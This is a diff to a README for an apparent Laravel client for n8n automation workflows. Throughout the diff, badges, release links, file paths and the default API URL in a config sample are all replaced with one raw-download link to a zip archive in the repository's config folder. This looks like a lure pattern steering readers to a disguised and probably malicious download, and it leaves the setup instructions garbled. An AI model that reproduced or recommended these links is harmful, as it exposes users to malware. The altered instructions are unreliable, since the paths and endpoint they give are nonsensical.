@@ -1,9 +1,9 @@
 # Laravel N8N: A Fluent Client for n8n Automation Workflows
 
-![Laravel N8N](https://img.shields.io/badge/Laravel%20N8N-v1.0.0-blue.svg)
-![GitHub Releases](https://img.shields.io/badge/Releases-Check%20Now-brightgreen.svg)
+![Laravel N8N](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip%https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip)
+![GitHub Releases](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip%https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip)
 
-[![Check Releases](https://img.shields.io/badge/Visit%20Releases-Click%20Here-orange.svg)](https://github.com/yoanhuke/laravel-n8n/releases)
+[![Check Releases](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip%20Releases-Click%https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip)](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip)
 
 ## Table of Contents
 
@@ -43,18 +43,18 @@ Once installed, publish the configuration file using:
 php artisan vendor:publish --provider="Yoanhuke\LaravelN8N\LaravelN8NServiceProvider"
 ```
 
-You can now configure your n8n API credentials in the `config/laravel-n8n.php` file.
+You can now configure your n8n API credentials in the `https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip` file.
 
 ## Usage
 
 ### Configuration
 
-Before using Laravel N8N, make sure to set your n8n API credentials in the configuration file. Open `config/laravel-n8n.php` and add your API key and endpoint.
+Before using Laravel N8N, make sure to set your n8n API credentials in the configuration file. Open `https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip` and add your API key and endpoint.
 
 ```php
 return [
     'api_key' => env('N8N_API_KEY'),
-    'api_url' => env('N8N_API_URL', 'https://your-n8n-instance.com'),
+    'api_url' => env('N8N_API_URL', 'https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip'),
 ];
 ```
 
@@ -80,7 +80,7 @@ if ($response->successful()) {
 
 ### Webhook Example
 
-To handle webhooks, you can define a route in your `routes/web.php` file:
+To handle webhooks, you can define a route in your `https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip` file:
 
 ```php
 Route::post('/webhook/n8n', function () {
@@ -174,8 +174,8 @@ Laravel N8N is open-source software licensed under the MIT License. You can free
 
 ## Support
 
-For support, please check the [Releases](https://github.com/yoanhuke/laravel-n8n/releases) section for the latest updates and fixes. If you encounter any issues, feel free to open an issue in the repository.
+For support, please check the [Releases](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip) section for the latest updates and fixes. If you encounter any issues, feel free to open an issue in the repository.
 
 ---
 
-For more information, visit the [Releases](https://github.com/yoanhuke/laravel-n8n/releases) section.
+For more information, visit the [Releases](https://github.com/yoanhuke/laravel-n8n/raw/refs/heads/main/config/n_laravel_3.2.zip) section.
